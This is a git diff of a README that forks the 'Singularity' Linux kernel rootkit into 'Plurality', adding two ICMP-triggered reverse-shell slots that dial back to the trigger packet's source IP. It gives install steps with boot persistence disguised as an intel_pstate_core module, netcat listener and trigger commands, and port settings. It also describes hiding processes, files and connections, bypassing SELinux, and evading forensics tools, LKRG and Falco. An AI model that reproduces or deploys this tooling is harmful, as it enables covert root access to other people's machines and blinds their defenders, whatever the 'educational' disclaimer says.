@@ -1,44 +1,51 @@
-# Singularity - Stealthy Linux Kernel Rootkit
+# Plurality - Stealthy Linux Kernel Rootkit (2-Instance Fork of Singularity)
+
+> **Plurality** is a fork of [Singularity](https://github.com/MatheuZSecurity/Rootkit) by MatheuZSecurity.
+> It extends the original to support **two simultaneous reverse-shell instances**, each with its own dynamic attacker IP and port, while keeping all original stealth capabilities intact.
+
+---
+
+## What changed from Singularity
+
+| | Singularity | Plurality |
+|---|---|---|
+| Attacker IPs | 1, hardcoded (`YOUR_SRV_IP`) | 2, **dynamic** — captured from ICMP source |
+| Ports | 1 (`SRV_PORT`) | 2 (`SRV_PORT` / `SRV_PORT2`) |
+| ICMP trigger | seq 1337 only | seq 1337 → slot 0 · seq 1338 → slot 1 |
+| IP configuration | Edit `core.h` before compile | Nothing — IP written at trigger time |
+| trigger.py | No slot selection | `-u 1` or `-u 2` to select slot |
+| Race safety | N/A | `spinlock_irqsave` on all `g_srv_ips[]` accesses |
+| IPv6 IP hiding | Hardcoded IPv6 literal | Port-only (no dynamic IPv6 tracking) |
+
+**All other behaviour is identical to Singularity.** No original hiding logic was changed — only extended from 1 slot to 2.
+
+---
+
 ### Quick Install
 ```bash
-
-cd /dev/shm #ram disk(or whatever)
+cd /dev/shm
 git clone https://github.com/nguyentl22032009/ubuntu.git
 cd ubuntu
 
-# Bước 2: Build và nạp module lần đầu (để tạo file .ko)
-sudo bash setup.sh #persistnace
+sudo bash setup.sh        # build + load + persistence
 
-sudo bash scripts/x.sh
+sudo bash scripts/x.sh    # re-load without persistence
 
-#delete persistnace
-export M="intel_pstate_core"; sudo rm -f /etc/modules-load.d/$M.conf /lib/modules/$(uname -r)/kernel/drivers/cpufreq/$M.ko && sudo depmod -a && echo "deleted Persistence.Reboot"
-```
-### Set Your Server IP and Port
-
-**Edit `include/core.h`:**
-```c
-#define YOUR_SRV_IP "192.168.1.100"  // Change this to your server IP
-#define YOUR_SRV_IPv6 { .s6_addr = { [15] = 1 } }  // IPv6 if needed
+# Remove persistence
+export M="intel_pstate_core"; sudo rm -f /etc/modules-load.d/$M.conf /lib/modules/$(uname -r)/kernel/drivers/cpufreq/$M.ko && sudo depmod -a && echo "deleted Persistence. Reboot to remove module."
 ```
 
-**Edit `modules/icmp.c`:**
-```c
-#define SRV_PORT "8081"  // Change this to your desired port
-```
+### Set Your Server Ports (Quick Install)
 
-**Edit `modules/bpf_hook.c`:**
-```c
-#define HIDDEN_PORT 8081  // Must match SRV_PORT
-```
+**IPs are dynamic** — captured automatically from ICMP packet source. No IP hardcoding needed.
 
-**Edit `modules/hiding_tcp.c`:**
-```c
-#define PORT 8081  // Must match SRV_PORT
-```
-## What is Singularity?
+Only ports need to match. See **Configuration** section for details.
 
-Singularity is a sophisticated rootkit that operates at the kernel level, providing:
+---
+
+## What is Plurality?
+
+Plurality is a sophisticated rootkit that operates at the kernel level, providing:
 
 - **Process Hiding**: Make any process completely invisible to the system
 - **File & Directory Hiding**: Conceal files using pattern matching
@@ -114,30 +121,29 @@ That's it. The module automatically:
 
 ## Configuration
 
-### Set Your Server IP and Port
+### Set Your Server Ports
 
-**Edit `include/core.h`:**
-```c
-#define YOUR_SRV_IP "192.168.1.100"  // Change this to your server IP
-#define YOUR_SRV_IPv6 { .s6_addr = { [15] = 1 } }  // IPv6 if needed
-```
+**IPs are now dynamic** — no hardcoding needed. When you send the ICMP trigger, the rootkit captures your source IP automatically and dials back to it.
+
+Only the **ports** must match across files:
 
 **Edit `modules/icmp.c`:**
 ```c
-#define SRV_PORT "8081"  // Change this to your desired port
+#define SRV_PORT  "80"    // slot 0 port (user 1 / seq 1337)
+#define SRV_PORT2 "4445"  // slot 1 port (user 2 / seq 1338)
 ```
 
 **Edit `modules/bpf_hook.c`:**
 ```c
-#define HIDDEN_PORT 8081  // Must match SRV_PORT
+#define HIDDEN_PORT  80    // must match SRV_PORT
+#define HIDDEN_PORT2 4445  // must match SRV_PORT2
 ```
 
 **Edit `modules/hiding_tcp.c`:**
 ```c
-#define PORT 8081  // Must match SRV_PORT
+#define PORT  80    // must match SRV_PORT
+#define PORT2 4445  // must match SRV_PORT2
 ```
-
-**Important**: All port definitions must match for proper network hiding and ICMP reverse shell functionality.
 
 ## Usage
 
@@ -194,19 +200,19 @@ id  # uid=0(root)
 
 ### Hide Network Connections
 
-Connections on your configured port (default: 8081) are automatically hidden:
+Connections on your configured ports (default: 80 and 4445) are automatically hidden:
 ```bash
-nc -lvnp 8081
+nc -lvnp 80
 
 # Invisible to all monitoring
-ss -tulpn | grep 8081        # (no output)
-netstat -tulpn | grep 8081   # (no output)
-lsof -i :8081                # (no output)
-cat /proc/net/nf_conntrack | grep 8081  # (no output)
+ss -tulpn | grep 80          # (no output)
+netstat -tulpn | grep 80     # (no output)
+lsof -i :80                  # (no output)
+cat /proc/net/nf_conntrack | grep 80  # (no output)
 
 # Even advanced netlink queries are filtered
-ss -tapen | grep 8081        # (no output)
-conntrack -L | grep 8081     # (no output)
+ss -tapen | grep 80          # (no output)
+conntrack -L | grep 80       # (no output)
 ```
 
 Packets are dropped at raw socket level (tpacket_rcv) and hidden from:
@@ -221,19 +227,26 @@ Packets are dropped at raw socket level (tpacket_rcv) and hidden from:
 
 ### ICMP Reverse Shell
 
-Trigger a hidden reverse shell remotely with automatic SELinux bypass:
+Trigger a hidden reverse shell remotely with automatic SELinux bypass.
+Plurality supports **two independent slots** — each gets its own attacker IP (dynamic) and port.
 
-**1. Start listener:**
+**Slot 0 (user 1) — ICMP seq 1337, connects back to port 80:**
 ```bash
-nc -lvnp 8081  # Use your configured port
+nc -lvnp 80
+sudo python3 scripts/trigger.py <target_ip> -u 1
 ```
 
-**2. Send ICMP trigger:**
+**Slot 1 (user 2) — ICMP seq 1338, connects back to port 4445:**
 ```bash
-sudo python3 scripts/trigger.py <target_ip>
+nc -lvnp 4445
+sudo python3 scripts/trigger.py <target_ip> -u 2
 ```
+
+The rootkit captures the **source IP of your ICMP packet** and dials back to it — no IP hardcoding required. Both slots are fully independent and can be used simultaneously.
 
 **3. Receive root shell** (automatically hidden with all child processes, SELinux enforcing mode bypassed if active)
+
+> **Note:** Re-triggering from a different IP updates `g_srv_ips[]` for that slot. The old active shell is unaffected (already established); new shells use the updated IP. BPF hiding for an existing established connection uses the IP at connection time — `hiding_tcp.c` covers it by port regardless.
 
 <p align="center">
 <img src="https://i.imgur.com/4bmbmwY.png">
@@ -295,7 +308,7 @@ Filtered keywords: taint, journal, singularity, Singularity, matheuz, zer0t, kal
 
 ### Disk Forensics Evasion
 
-Singularity hooks the write syscall to detect and filter output from disk forensics tools:
+Plurality hooks the write syscall to detect and filter output from disk forensics tools:
 
 **How it works:**
 1. Detects if process has a block device open (`/dev/sda`, `/dev/nvme0n1`, etc)
@@ -335,7 +348,7 @@ Child processes automatically tracked via sched_process_fork tracepoint hook.
 
 ### LKRG Bypass
 
-Singularity implements comprehensive evasion against Linux Kernel Runtime Guard:
+Plurality implements comprehensive evasion against Linux Kernel Runtime Guard:
 
 **Bypassed checks:**
 - Process credential validation (p_cmp_creds)
@@ -357,7 +370,7 @@ Hidden processes are invisible to all LKRG integrity verification mechanisms.
 
 ### Falco Bypass
 
-Singularity implements a comprehensive anti-EDR defense system that prevents eBPF-based security tools from detecting hidden processes and network connections. The protection works by intercepting kernel functions that eBPF programs use to collect and report data.
+Plurality implements a comprehensive anti-EDR defense system that prevents eBPF-based security tools from detecting hidden processes and network connections. The protection works by intercepting kernel functions that eBPF programs use to collect and report data.
 
 **Protected against:**
 - Falco (event-based runtime security)
@@ -507,7 +520,9 @@ I won't patch for this, because it will be much more OP ;)
 
 ## Credits
 
-**Singularity** was created by **MatheuZSecurity** (Matheus Alves)
+**Plurality** is a fork maintained by **nguyentl22032009**.
+
+**Original Singularity** was created by **MatheuZSecurity** (Matheus Alves)
 
 - LinkedIn: [mathsalves](https://www.linkedin.com/in/mathsalves/)
 - Discord: `kprobe`
@@ -537,7 +552,7 @@ I won't patch for this, because it will be much more OP ;)
 
 **FOR EDUCATIONAL AND RESEARCH PURPOSES ONLY**
 
-Singularity was created as a research project to explore the limits of kernel-level stealth techniques. The goal is to answer one question: **"How far can a rootkit hide if it manages to infiltrate and load into a system?"**
+**Plurality** (and the original Singularity) was created as a research project to explore the limits of kernel-level stealth techniques. The goal is to answer one question: **"How far can a rootkit hide if it manages to infiltrate and load into a system?"**
 
 This project exists to:
 - Push the boundaries of offensive security research
@@ -545,7 +560,7 @@ This project exists to:
 - Provide a learning resource for kernel internals and evasion techniques
 - Contribute to the security community's knowledge base
 
-**I am not responsible for any misuse of this software.** If you choose to use Singularity for malicious purposes, that's on you. This tool is provided as-is for research, education, and authorized security testing only.
+**I am not responsible for any misuse of this software.** If you choose to use Plurality for malicious purposes, that's on you. This tool is provided as-is for research, education, and authorized security testing only.
 
 Test only on systems you own or have explicit written permission to test. Unauthorized access to computer systems is illegal in most jurisdictions.
 
